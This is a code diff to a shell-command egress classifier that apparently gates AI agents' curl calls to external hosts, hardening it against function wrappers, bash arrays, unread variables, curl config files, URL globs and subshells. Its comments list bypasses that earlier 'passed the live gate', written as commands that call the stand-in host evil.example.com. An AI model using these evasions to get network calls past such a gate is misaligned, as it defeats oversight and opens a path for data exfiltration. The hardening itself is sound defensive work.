@@ -296,6 +296,12 @@ export function commandIndex(mw) {
   let i = 0
   while (i < mw.length) {
     if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(mw[i])) { i++; continue }
+    // A function definition's head: its body is a command line, run when the name is called.
+    // `f(){ curl https://evil.example.com/x; }; f` passed the live gate: the command word read was
+    // `f(){` (dexter, card d6b95892). Forms: `f(){`, `f()`, zsh `f () {`, `function f [()] {`.
+    if (mw[i] === 'function') { i += 2; continue }
+    if (/^\(\)\{?$/.test(mw[i + 1] ?? '') && !/^\(\)/.test(mw[i])) { i += 2; continue }
+    if (/^[^=]*\(\)\{?$/.test(mw[i])) { i++; continue }
     const p = mw[i].split('/').pop()
     if (!PREFIX_WORDS.has(p)) break
     i++
@@ -361,11 +367,29 @@ function collectAssignments(orig, masked) {
   for (const [a, b] of spans(masked)) {
     const seg = orig.slice(a, b)
     for (const m of seg.matchAll(/(?:^|\s)(?:export\s+|local\s+|readonly\s+)?([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|([^\s]*))/g)) {
+      if (m[5]?.startsWith('(')) continue // an array: collectArrays
       env[m[1]] = m[3] ?? m[4] ?? m[5] ?? ''
     }
     for (const [name, value] of printfAssignments(seg)) env[name] = value
   }
   return env
+}
+// `NAME=(w1 w2 ...)`, written once and in no other way: `"${NAME[@]}"`, `"${NAME[*]}"` and `$NAME` in a
+// curl argv stand for its words (the fleet's `H=(-H "Authorization: ..."); curl "${H[@]}" URL`, 42 of
+// 21 086 fleet commands, d6b95892). A name written twice, or also by `+=`, `[i]=`, read, ... keeps its
+// array unread, and its reference in a destination stays unreadable.
+function collectArrays(orig, masked, env = {}) {
+  const out = {}
+  for (const m of masked.matchAll(/(?:^|[\s;&|(])(?:(?:local|declare|typeset|readonly|export)\s+(?:-\w+\s+)*)?([A-Za-z_][A-Za-z0-9_]*)=\(/g)) {
+    const name = m[1]
+    const open = m.index + m[0].length
+    const close = masked.indexOf(')', open)
+    // every spelling of the name counts: a second `NAME=(...)`, `NAME+=`, `NAME[i]=`, `read NAME`
+    const writes = [...masked.matchAll(new RegExp(String.raw`(?<![\w$#!{./@:-])${name}(?![\w./@:-])`, 'g'))].length
+    if (close === -1 || writes !== 1) continue
+    out[name] = shellWords(expand(orig.slice(open, close), env))
+  }
+  return out
 }
 // `printf -v NAME FORMAT ARGS...` assigns too (didi round 4 item 3: `printf -v h %s evil.example.com;
 // curl $h` passed). The value is the format with its conversions filled from the arguments in order.
@@ -692,8 +716,92 @@ const CURL_FILE_LONG = new Set(['output', 'output-dir', 'dump-header', 'cookie-j
 // `${...}` that is not a plain `${NAME}` (`${!r}`, `${h/a/b}`, `${h:9}`, `${a[0]}`) after expand():
 // its value is computed, not read (didi round 6 item 4).
 const COMPUTED_PARAM = /\$\{(?![A-Za-z_][A-Za-z0-9_]*\})/
-export function curlDestinations(args, inners = null, fileValues = null) {
+// The part of a curl URL that decides WHERE it connects: the scheme prefix and the authority, up to
+// the first / ? # (didi 35993). In it, a glob ({a,b}, [n-m]) is expanded by curl itself, or unquoted
+// by the shell, -g or not: the host is a set this reading does not enumerate (`http://{localhost,
+// evil.example.com}/x` fetched both). Likewise a `$` that is not a plain $NAME / ${NAME} (`$1`, `$@`,
+// zsh `$^a`), a leftover array value `(x y)`, or a backslash escape (`$'...\x2e...'`). A bracketed
+// IPv6 literal is the one bracket curl does not glob. A glob AFTER the authority (path, query) cannot
+// move the host and stays readable.
+function unreadableHostHead(value) {
+  const s = String(value)
+  const scheme = /^[^/?#\s]*:\/\//.exec(s)?.[0] ?? ''
+  const head = scheme + s.slice(scheme.length).split(/[/?#]/)[0]
+  const rest = head.replace(/(^|@|\/\/)\[[0-9a-f:.]+\](?=:|$)/i, '$1')
+  return /[{}[\]()\\]/.test(rest) || /\$(?![A-Za-z_{])/.test(rest)
+}
+// A `$NAME` this command leaves unexpanded is trusted as the agent's environment (`curl "$DASH/api"`)
+// only while the command itself never writes NAME in a form the assignment reading does not take:
+// `h+=x`, `h[0]=x`, `h=(x)`, `set -A h x`, `read h`, `getopts ab h` (didi 35993 item 3, and `read -r u
+// < f; curl "$u"` passed with a URL from a file). The test is the NAME standing as a word anywhere in
+// the command other than a plain `NAME=value` or `for NAME in`: what writes a name has to spell it, so
+// the list of writing builtins is not needed (a mention that writes nothing errs toward a deny).
+function writesNameUnread(text, name, fed = []) {
+  const re = new RegExp(String.raw`(?<![\w$#!{./@:-])${name}(?![\w./@:-])`, 'g')
+  for (const m of String(text).matchAll(re)) {
+    if (fed.some(([a, b]) => m.index >= a && m.index < b)) continue
+    const after = text.slice(m.index + name.length)
+    if (/^=(?!\()/.test(after)) continue
+    if (/^\s+in(?:\s|$)/.test(after) && /(?:^|[\s;&|(!{])for\s+$/.test(text.slice(0, m.index))) continue
+    return true
+  }
+  return false
+}
+// The names a command references as $NAME / ${NAME...} (in `refs`: the masked text blanks a quoted
+// "https://$h/x") that it also writes unread in `text` (see above).
+// `fed`: the [start, end) of each `read` fed by a here-string or heredoc of this line (fedReads): its
+// values are read from that text (collectReads / readValues), so its names are not written unread.
+function unreadNames(text, inherited = null, refs = text, fed = []) {
+  const out = new Set(inherited ?? [])
+  for (const m of String(refs).matchAll(/\$\{?[#!]?([A-Za-z_][A-Za-z0-9_]*)/g)) {
+    if (!out.has(m[1]) && writesNameUnread(text, m[1], fed)) out.add(m[1])
+  }
+  return out
+}
+// The `read` commands whose input is a here-string or heredoc of this line: `read u <<< X`, `read u
+// <<EOF`, and `while read u; do ...; done <<< X` (the `done` matching that loop, nested loops
+// counted). A `read` from a file, a pipe or `< <(...)` is not in it: its values are not on the line.
+const LOOP_HEAD = new Set(['while', 'until', 'for', 'select'])
+// `herestrings`: the offsets of the line's `<<<` operators (liftSubstitutions blanks them in `orig`).
+function fedReads(orig, masked, herestrings = []) {
+  const sp = spans(masked)
+  const out = []
+  const fedBy = (k) => herestrings.some((at) => at >= sp[k][0] && at < sp[k][1]) || /<<(?!<?\s*\()/.test(masked.slice(...sp[k]))
+  sp.forEach(([a, b], i) => {
+    const sw = shellWords(orig.slice(a, b))
+    let k = commandIndex(sw)
+    const loop = sw[k] === 'while' || sw[k] === 'until'
+    if (loop) k += 1 + commandIndex(sw.slice(k + 1))
+    if (sw[k] !== 'read') return
+    if (!loop) { if (fedBy(i)) out.push([a, b]); return }
+    let depth = 0
+    for (let j = i + 1; j < sp.length; j++) {
+      const w = shellWords(orig.slice(...sp[j]))[0]
+      if (LOOP_HEAD.has(w)) depth++
+      else if (w === 'done' && depth-- === 0) { if (fedBy(j)) out.push([a, b]); return }
+    }
+  })
+  return out
+}
+// A curl reads ~/.curlrc (or $CURL_HOME/.curlrc, $XDG_CONFIG_HOME/curlrc) before its argv: a command
+// that names that file writes or points at a config the argv reading never sees (quotes and
+// backslashes dropped first: `.curl''rc` is the same file).
+const CURLRC = /curlrc|CURL_HOME|XDG_CONFIG_HOME/
+// `ctx`: { unread: names written unread (unreadNames), text: the whole command, arrays: collectArrays }.
+export function curlDestinations(args, inners = null, fileValues = null, ctx = null) {
   const dests = []
+  const arrays = ctx?.arrays ?? {}
+  args = args.flatMap((w) => {
+    const m = /^\$(?:\{([A-Za-z_][A-Za-z0-9_]*)\[[@*]\]\}|([A-Za-z_][A-Za-z0-9_]*))$/.exec(w)
+    const name = m && (m[1] ?? m[2])
+    return name && arrays[name] ? arrays[name] : [w]
+  })
+  if (ctx?.text && CURLRC.test(String(ctx.text).replace(/['"\\]/g, ''))) dests.push('<curlrc>')
+  const unreadVar = (part) => {
+    if (!ctx?.unread?.size) return false
+    for (const m of part.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) if (ctx.unread.has(m[1])) return true
+    return false
+  }
   const fromMarks = (part) => {
     if (!inners || !MARKS.test(part)) return false
     for (const k of new Set([...part].filter((c) => MARKS.test(c)).map((c) => c.charCodeAt(0) - MARK_BASE))) {
@@ -703,11 +811,17 @@ export function curlDestinations(args, inners = null, fileValues = null) {
     return true
   }
   const addUrl = (v) => {
+    if (v == null) return
+    // A `)` ending the word is the shell's, a subshell's end, unless the word opened one itself:
+    // `(curl -s http://evil.example.com)` passed the live gate, its host read `evil.example.com)` is
+    // no host name (dexter, card d6b95892). Stripped, the host is judged; a `)` in the middle stays.
+    v = String(v).replace(/^([^(]*?)\)+$/, '$1')
+    // checked before destHost: `{http://localhost/,http://evil.example.com/}` has a local hostPortion
+    if (unreadableHostHead(v)) { fromMarks(hostPortion(v)); dests.push(`<unreadable host: ${v}>`); return }
     const h = destHost(v)
     if (h) { dests.push(h); return }
-    if (v == null) return
     const part = hostPortion(v)
-    if (!fromMarks(part) && COMPUTED_PARAM.test(part)) dests.push(part)
+    if (!fromMarks(part) && (COMPUTED_PARAM.test(part) || unreadVar(part))) dests.push(part)
   }
   const addParts = (v) => { for (const p of String(v).split(':')) if (HOSTNAME.test(p)) dests.push(p.toLowerCase()); else fromMarks(p) }
   for (let k = 0; k < args.length; k++) {
@@ -718,7 +832,9 @@ export function curlDestinations(args, inners = null, fileValues = null) {
       const [name, inline] = w.slice(2).split(/=(.*)/s)
       if (!CURL_LONG_WITH_VALUE.has(name)) continue
       const v = inline !== undefined ? inline : args[++k]
-      if (CURL_DEST_URL.has(name)) addUrl(v)
+      // a config (file, `-` stdin, a here-string) carries url / proxy lines the argv never shows
+      if (name === 'config') dests.push(`<curl config: ${v ?? ''}>`)
+      else if (CURL_DEST_URL.has(name)) addUrl(v)
       else if (CURL_DEST_PARTS.has(name)) addParts(v)
       else if (fileValues && CURL_FILE_LONG.has(name) && v != null) fileValues.add(v)
       continue
@@ -727,7 +843,8 @@ export function curlDestinations(args, inners = null, fileValues = null) {
       for (let q = 1; q < w.length; q++) {
         if (!CURL_SHORT_WITH_VALUE.has(w[q])) continue
         const v = q + 1 < w.length ? w.slice(q + 1) : args[++k]
-        if (CURL_DEST_URL.has(w[q])) addUrl(v)
+        if (w[q] === 'K') dests.push(`<curl config: ${v ?? ''}>`)
+        else if (CURL_DEST_URL.has(w[q])) addUrl(v)
         else if (fileValues && CURL_FILE_SHORT.has(w[q]) && v != null) fileValues.add(v)
         break
       }
@@ -1039,7 +1156,7 @@ const IPV4_SHAPE = /^\d{1,3}(?:\.\d{1,3}){3}$/
 // every NAME=value in the line is a value $NAME can take (didi's review 3: `h=evil; curl $h` passed).
 // `fileValues` collects the output-file values, which the word reading then skips.
 const UNREAD_ASSIGN = /(?:^|[\s;&|(])(?:export\s+|local\s+|readonly\s+)?([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|([^\s;&|)]*))/g
-function unreadableCurlHosts(text, fileValues) {
+function unreadableCurlHosts(text, fileValues, inheritedArrays = null) {
   const { marked, inners } = markAllSubstitutions(text)
   const values = {}
   for (const m of marked.matchAll(UNREAD_ASSIGN)) (values[m[1]] ??= []).push(m[3] ?? m[4] ?? m[5] ?? '')
@@ -1054,6 +1171,9 @@ function unreadableCurlHosts(text, fileValues) {
     for (const v of names.length ? names : ['REPLY']) (values[v] ??= []).push(...said, said.join(' '))
   }
   for (const [name, value] of printfAssignments(marked)) (values[name] ??= []).push(value)
+  const unread = unreadNames(marked)
+  for (const v of unread) delete values[v]
+  const arrays = { ...(inheritedArrays ?? {}), ...collectArrays(marked, marked) }
   const last = Object.fromEntries(Object.entries(values).map(([v, xs]) => [v, xs[xs.length - 1]]))
   const out = []
   for (const m of marked.matchAll(/(?:^|[^A-Za-z0-9_-])curl(?![A-Za-z0-9_-])/gi)) {
@@ -1061,7 +1181,7 @@ function unreadableCurlHosts(text, fileValues) {
     // past MAX_LOOP_VARIANTS combinations, each variable's last value is read (the line still denies
     // on any literal host it holds)
     for (const t of [seg, ...(loopVariants(seg, {}, values) ?? [expand(seg, last)])]) {
-      out.push(...curlDestinations(shellWords(t), inners, fileValues))
+      out.push(...curlDestinations(shellWords(t), inners, fileValues, { unread, text, arrays }))
     }
   }
   return out
@@ -1087,10 +1207,11 @@ function unreadableWordHosts(text, skip = new Set()) {
   }
   return out
 }
-function unreadableVerdict(text, vendorHosts, vendorDomains) {
+// `arrays`: the arrays of the line this text was lifted from (classify's unreadable branch).
+function unreadableVerdict(text, vendorHosts, vendorDomains, arrays = null) {
   if (namesNetwork(text)) {
     const files = new Set()
-    const curlHosts = unreadableCurlHosts(text, files)
+    const curlHosts = unreadableCurlHosts(text, files, arrays)
     const found = [...externalHosts(text, vendorHosts, vendorDomains), ...curlHosts, ...unreadableWordHosts(text, files)]
     const hosts = [...new Set(found)].filter((h) => !isLocalHost(h) && !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
     if (hosts.length) return { deny: true, reason: 'unparseable-external', hosts }
@@ -1253,20 +1374,20 @@ function argsBefore(orig, masked, at) {
 // The curl destinations a substitution builds on a readable line (didi F3, card c8b1ccbf): the
 // sub-command read from the MARKED text, every loop reading too, so a host part holding a marker names
 // the substitution that built it (curlDestinations reads that substitution's command for hosts).
-function substitutedCurlHosts(seg, env, loops, inners) {
+function substitutedCurlHosts(seg, env, loops, inners, ctx) {
   const out = []
   for (const t of [expand(seg, env), ...(loopVariants(seg, env, loops) ?? [])]) {
     if (!MARKS.test(t)) continue
     const argv = shellWords(t)
     const at = argv.findIndex((w) => normalizedName(w) === 'curl')
-    if (at !== -1) out.push(...curlDestinations(argv.slice(at + 1), inners))
+    if (at !== -1) out.push(...curlDestinations(argv.slice(at + 1), inners, null, ctx))
   }
   return out
 }
 // A variable assigned from a substitution (`x=$(...)`, `export x="$(...)"`): the text before the `$(`.
 const ASSIGNED_FROM_SUBST = /(?:^|[\s;&|(])(?:export\s+|local\s+|readonly\s+|declare\s+(?:-\w+\s+)?)?([A-Za-z_][A-Za-z0-9_]*)="?$/
 // `substituted`: this text is the inside of a $(...) / `...`, whose output the outer line uses.
-// `inherited`: the assignments and loop values of the line this text is part of ({ env, loops, untrusted }).
+// `inherited`: the assignments and loop values of the line this text is part of ({ env, loops, untrusted, unread, arrays }).
 // A substitution runs in the loop it sits in, so `for u in URL; do echo "$(curl $u)"; done` reads
 // the inner curl with u bound (card c8b1ccbf, shape 6: live on 2026-10-15, four requests went out).
 export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set(), substituted = false, inherited = null) {
@@ -1275,19 +1396,27 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
   const masked = maskInertLiterals(orig)
   if (masked === null || masked.length !== orig.length) {
     const untrusted = Boolean(inherited?.untrusted) || definesCommands(norm) || DEFINES_IN_QUOTES.test(norm)
+    // An unclosed `...` / $(...) lifts the REST of the line as its inner text: an array the line wrote
+    // before it is out of that text (ford's `H=(-H ...); curl "${H[@]}" URL | python3 -c "...\`..."`
+    // read `${H[@]}` as an unknown host, d6b95892 fleet replay). The line's arrays go with it.
+    const arrays = { ...(inherited?.arrays ?? {}), ...collectArrays(norm, norm) }
     if (depth < 4) {
-      for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains, true, { ...inherited, untrusted }); if (r.deny) return r }
+      for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains, true, { ...inherited, untrusted, arrays }); if (r.deny) return r }
     }
-    return unreadableVerdict(norm, vendorHosts, vendorDomains)
+    return unreadableVerdict(norm, vendorHosts, vendorDomains, inherited?.arrays)
   }
   // A line that redefines commands: no echo / printf / cat proves a literal print, here or in what it runs.
   const untrusted = Boolean(inherited?.untrusted) || definesCommands(masked) || DEFINES_IN_QUOTES.test(orig)
   const trustPrint = !untrusted
+  // Names written in a form the assignment reading does not take stay unexpanded, in every reading.
+  const unread = unreadNames(masked, inherited?.unread, orig, fedReads(orig, masked, herestrings))
   const env = { ...(inherited?.env ?? {}), ...collectAssignments(orig, masked) }
   const loops = { ...(inherited?.loops ?? {}), ...collectLoops(orig, masked, env) }
   // The same assignments read from the MARKED text (`h=$(...)` keeps its marker), and each substitution's
   // command with this line's assignments expanded: what a curl destination built by one can be (F3).
   const markedEnv = { ...(inherited?.env ?? {}), ...collectAssignments(marked, masked) }
+  for (const v of unread) { delete env[v]; delete markedEnv[v] }
+  const arrays = { ...(inherited?.arrays ?? {}), ...collectArrays(orig, masked, env) }
   const innerTexts = inners.map((x) => expand(x, env))
   // `x=$(cat <<EOF ... EOF); curl "$x"`: the substitution's output is not known, but a URL written in
   // it is a value x can take (card c8b1ccbf, shape 5). Judged like a loop value; the plain reading,
@@ -1308,7 +1437,7 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     for (const r of reads) for (const [v, vals] of Object.entries(readValues(text, r))) loops[v] = [...(loops[v] ?? []), ...vals]
   }
   if (depth < 4) {
-    for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains, true, { env, loops, untrusted }); if (r.deny) return r }
+    for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains, true, { env, loops, untrusted, unread, arrays }); if (r.deny) return r }
   }
   // A heredoc / here-string that IS the program of an interpreter is judged like a -c / -e body: the
   // same NET_PRIMITIVE test, the same URL_RE scan, the same local / private / vendor exceptions. A
@@ -1325,7 +1454,7 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
       // What the interpreter leaves of the stdin, the rest of the body reads (`bash -c 'python3 -c
       // X; bash'`): the body stays a command line as well.
       for (const text of depth < 4 ? [plain, ...(variants ?? [])] : []) {
-        const r = classify(text, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted })
+        const r = classify(text, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted, unread, arrays })
         if (r.deny) return { ...r, reason: `heredoc-${r.reason}` }
       }
       cmd = handedTo; shell = false
@@ -1346,7 +1475,7 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
       // `cat <<S | bash`): then it is a program and gets the whole analysis.
       if (depth >= 4 || !feedRunsAsProgram(orig, masked, f.at, trustPrint)) continue
       for (const text of [plain, ...(variants ?? [])]) {
-        const r = classify(text, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted })
+        const r = classify(text, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted, unread, arrays })
         if (r.deny) return { ...r, reason: `heredoc-${r.reason}` }
       }
       if (variants === null) return { deny: true, reason: 'heredoc-loop-unbounded', hosts: [] }
@@ -1355,7 +1484,7 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     for (const text of [plain, ...(variants ?? [])]) {
       if (shell) {
         if (depth >= 4) break
-        const r = classify(text, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted })
+        const r = classify(text, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted, unread, arrays })
         // The unreadable-line rule judges a PROGRAM. A body fed to a script as data keeps the reading
         // it had before card c8b1ccbf: measured on 4 days of fleet commands (21 086), the one heredoc
         // it would have newly denied was an agent-msg.sh message mentioning a link.
@@ -1406,7 +1535,7 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
         const body = at === -1 ? null : shellCBody(argv.slice(at + 1))
         if (body === null) continue
         const r = depth < 4
-          ? classify(body, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted })
+          ? classify(body, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted, unread, arrays })
           : unreadableVerdict(body, vendorHosts, vendorDomains)
         if (r.deny) return { ...r, reason: `shell-c-${r.reason}` }
         if (viaXargs && namesNetwork(body)) {
@@ -1432,8 +1561,9 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
       const argv = target === 'curl' ? shellWords(text) : null
       const at = argv ? argv.findIndex((w) => normalizedName(w) === 'curl') : -1
       if (at !== -1) {
-        substHosts ??= substitutedCurlHosts(marked.slice(a, b), markedEnv, loops, innerTexts)
-        found = [...curlDestinations(argv.slice(at + 1)), ...substHosts]
+        const ctx = { unread, text: norm, arrays }
+        substHosts ??= substitutedCurlHosts(marked.slice(a, b), markedEnv, loops, innerTexts, ctx)
+        found = [...curlDestinations(argv.slice(at + 1), null, null, ctx), ...substHosts]
       } else found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
       // A listed vendor host (or a host under a listed domain) passes only by itself: any other
       // destination in the same call still denies.
